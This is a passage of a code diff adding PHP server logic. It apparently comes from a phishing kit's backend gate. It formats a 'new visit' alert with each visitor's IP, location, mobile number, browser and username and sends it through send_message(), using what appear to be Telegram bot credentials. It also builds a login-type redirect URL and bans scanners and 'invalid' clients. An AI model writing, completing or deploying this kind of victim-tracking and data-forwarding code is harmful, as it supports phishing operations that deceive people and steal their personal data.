+                           $message = "
+✅ 🅽🅴🆆 🆅🅸🆂🅸🆃🅴   
+--------------------------------------------
+🏠  𝗣𝗿𝗼𝗷𝗲𝗰𝘁: {$project_name}
+👨‍🔧  𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲: {$username}
+📡  𝗘𝘅𝗽𝗶𝗿𝗲: {$expire}
+📡  𝗜𝗣: {$ipAddress}
+🌍  𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {$country}
+🗺️  𝗦𝗜𝗣: {$sip_name}
+💻  𝗖𝗶𝘁𝘆: {$city}
+📱  𝗠𝗼𝗯𝗶𝗹𝗲: {$mobile} 
+🌐  𝗕𝗿𝗼𝘄𝘀𝗲𝗿: {$browser} 
+🎫  𝗗𝗮𝘁𝗲/𝘁𝗶𝗺𝗲: {$log_date}
+--------------------------------------------";		
+                     		
+                     		
+                     	}
+                     	
+                           send_message($message,$userData['tokentel'],$userData['idtel']);
+                           $message_url = "$res_url/?id=$res_id&user=$res_ip&remote=$res_dir&type=login";
+			    
+                           $response = array_merge($userData, [
+                            'status'      => 'success',
+							'success'     => true,
+                            'message'     => 'ready',
+                            'agent'       => $userAgent,
+                            'ip'          => $ipAddress,
+                            'res_dir'     => $res_dir,
+                            'res_url'     => $res_url,
+                            'res_id'      => $res_id,
+                            'res_action'  => $res_action,
+                            'log_extract' => $log_extract,
+                            'message_url' => $message_url,
+                        ]);
+                    } else {
+                         $response = array_merge($result, [
+                            'status'      => 'error',
+                            'message'     => 'blacklisted extractor',
+                            'agent'       => $userAgent,
+                            'ip'          => $ipAddress,
+                            'log_extract' => $log_extract,
+                        ]);
+                    }
+                } else {
+                    $response = [
+                        'status'  => 'error',
+                        'message' => 'Main extract domain',
+                        'agent'   => $userAgent,
+                        'ip'      => $ipAddress,
+                    ];
+                  }
+    		}else{
+    			$res = banned_client($ipAddress, 'invalid user', $client_info);
+                $response = array_merge($client_info, [
+                    'status'  => 'error',
+                    'message' => $res['message'],
+                    'agent'   => $userAgent,
+                    'ip'      => $ipAddress,
+                ]);
+    			
+    		}
+            if (!$success) {
+                sleep($retryDelay);
+            }
+        }
+    
+        break;
+    
+    default:
+	        $res = banned_client($ipAddress, 'invalid Request', $client_info);
+            $response = [
+                'status' => 'error',
+                'message' => 'Request processed by gserver.php',
+                'original_type' => $type
+            ];
+            break;
+}
+
+echo json_encode($response, JSON_UNESCAPED_UNICODE);
+
+
+
+
+?>
